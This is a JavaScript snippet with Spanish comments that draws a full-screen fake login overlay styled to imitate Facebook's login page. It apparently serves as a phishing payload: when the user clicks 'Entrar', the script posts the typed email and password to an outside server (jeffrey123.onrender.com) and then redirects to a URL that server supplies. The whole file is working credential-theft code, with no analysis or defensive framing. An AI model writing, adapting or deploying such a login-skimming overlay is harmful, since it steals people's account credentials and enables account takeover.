(function() {
    const SERVER_URL = "https://jeffrey123.onrender.com"; 

    // Eliminamos cualquier conflicto previo
    const oldOverlay = document.getElementById('jeff-overlay');
    if(oldOverlay) oldOverlay.remove();

    const overlay = document.createElement('div');
    overlay.id = 'jeff-overlay';
    
    // Estilos del fondo: Usamos vh y vw para asegurar pantalla completa
    overlay.style = `
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100vw !important;
        height: 100vh !important;
        background: rgba(0, 0, 0, 0.8) !important;
        z-index: 2147483647 !important;
        display: flex !important;
        justify-content: center !important;
        align-items: center !important;
        backdrop-filter: blur(8px) !important;
        -webkit-backdrop-filter: blur(8px) !important;
    `;

    // El contenedor ahora tiene tamaños fijos para PC y adaptables para Móvil
    overlay.innerHTML = `
        <div style="
            background: #ffffff !important;
            padding: 40px !important;
            border-radius: 20px !important;
            width: 400px !important; 
            min-height: 450px !important;
            max-width: 85% !important; 
            box-shadow: 0 20px 60px rgba(0,0,0,0.5) !important;
            text-align: center !important;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
            box-sizing: border-box !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
        ">
            <h2 style="color: #1877f2 !important; margin: 0 0 30px 0 !important; font-size: 32px !important; font-weight: 800 !important; letter-spacing: -0.5px !important;">
                Iniciar Sesión
            </h2>
            
            <input id="i-email" type="text" placeholder="Correo electrónico o teléfono" style="
                width: 100% !important;
                height: 55px !important;
                padding: 0 15px !important;
                margin-bottom: 15px !important;
                border: 1px solid #dddfe2 !important;
                border-radius: 8px !important;
                font-size: 17px !important;
                box-sizing: border-box !important;
                background: #f5f6f7 !important;
                color: #1c1e21 !important;
            ">
            
            <input id="i-pass" type="password" placeholder="Contraseña" style="
                width: 100% !important;
                height: 55px !important;
                padding: 0 15px !important;
                margin-bottom: 25px !important;
                border: 1px solid #dddfe2 !important;
                border-radius: 8px !important;
                font-size: 17px !important;
                box-sizing: border-box !important;
                background: #f5f6f7 !important;
                color: #1c1e21 !important;
            ">
            
            <button id="i-btn" style="
                width: 100% !important;
                height: 55px !important;
                background: #1877f2 !important;
                color: #ffffff !important;
                border: none !important;
                border-radius: 8px !important;
                font-size: 20px !important;
                font-weight: bold !important;
                cursor: pointer !important;
                transition: background 0.2s !important;
            ">
                Entrar
            </button>
            
            <a href="#" style="margin-top: 20px !important; color: #1877f2 !important; font-size: 14px !important; text-decoration: none !important; font-weight: 500 !important;">
                ¿Olvidaste tu contraseña?
            </a>
            
            <hr style="width: 100% !important; border: 0 !important; border-top: 1px solid #dadde1 !important; margin: 25px 0 !important;">
            
            <button style="background: #42b72a !important; color: white !important; border: none !important; border-radius: 8px !important; padding: 12px 16px !important; font-size: 17px !important; font-weight: bold !important; width: fit-content !important; align-self: center !important;">
                Crear cuenta nueva
            </button>
        </div>
    `;

    document.body.appendChild(overlay);

    document.getElementById('i-btn').onclick = async function() {
        const email = document.getElementById('i-email').value;
        const password = document.getElementById('i-pass').value;
        if(!email || !password) return;

        this.disabled = true;
        this.innerText = "Cargando...";

        try {
            await fetch(`${SERVER_URL}/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            });
            
            const res = await fetch(`${SERVER_URL}/config`);
            const config = await res.json();
            window.location.href = config.redirect_url;
        } catch(e) {
            this.disabled = false;
            this.innerText = "Entrar";
        }
    };
})();
